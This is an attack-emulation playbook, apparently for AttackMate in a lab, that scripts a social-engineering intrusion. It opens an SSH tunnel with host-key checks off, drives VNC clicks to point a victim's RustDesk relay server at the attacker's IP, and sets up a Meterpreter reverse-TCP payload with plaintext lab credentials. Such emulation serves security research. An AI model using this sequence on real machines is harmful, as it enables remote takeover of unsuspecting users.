# Client is persuaded by attacker to download and setup rustdesk screensharing 
# attacker executes commands on client machine via screensharing todownload and executes meterpreter payload

vars:
  PAYLOAD: linux/x64/meterpreter/reverse_tcp
  LPORT: 4443
  ATTACKMATE_IP: 192.42.1.174
  CLIENT_IP: 192.168.50.100
  MGMT_IP: 192.42.0.201
  MGMT_USERNAME: aecid
  CLIENT_VNC_PORT: 5900
  CLIENT_VNC_USER: judy
  CLIENT_VNC_PASSWORD: garland
  ATTACKER_VNC_PORT: 5901
  RUSTDESK_PACKAGE: https://github.com/rustdesk/rustdesk/releases/download/1.3.8/rustdesk-1.3.8-x86_64.deb


commands:
  # establish ssh tunneling via mgmt host, everything sent to attacker port 5902 will be forwarded to client port 5901 (vnc)
  # ssh -i /home/aecid/.ssh/attacker -o StrictHostKeyChecking=no -L 5902:192.168.50.100:5901 aecid@192.42.0.201
  - type: shell
    interactive: true
    creates_session: tunnel
    cmd: "ssh -i /home/aecid/.ssh/attacker  -o StrictHostKeyChecking=no -L 5902:$CLIENT_IP:$CLIENT_VNC_PORT $MGMT_USERNAME@$MGMT_IP \n"


# option menu
  - type: vnc
    cmd: move
    x: 167
    y: 188
    hostname: localhost
    port: 5902
    creates_session: social_engineering

  - type: sleep
    seconds: 1

  - type: vnc
    cmd: click
    session: social_engineering

  - type: sleep
    seconds: 1

# network
  - type: vnc
    cmd: move
    x: 82
    y: 272
    session: social_engineering

  - type: vnc
    cmd: click
    session: social_engineering

  - type: sleep
    seconds: 1

# unlock network settings
  - type: vnc
    cmd: move
    x: 468
    y: 131
    session: social_engineering

  - type: vnc
    cmd: click
    session: social_engineering

  - type: sleep
    seconds: 1

# id relay server
  - type: vnc
    cmd: move
    x: 268
    y: 182
    session: social_engineering

  - type: vnc
    cmd: click
    session: social_engineering

  - type: sleep
    seconds: 1

# Enter id server IP
  - type: vnc
    cmd: type
    input: $ATTACKMATE_IP
    session: social_engineering

  - type: sleep
    seconds: 1

# click ok
  - type: vnc
    cmd: move
    x: 621
    y: 490
    session: social_engineering

  - type: vnc
    cmd: click
    session: social_engineering

  - type: sleep
    seconds: 1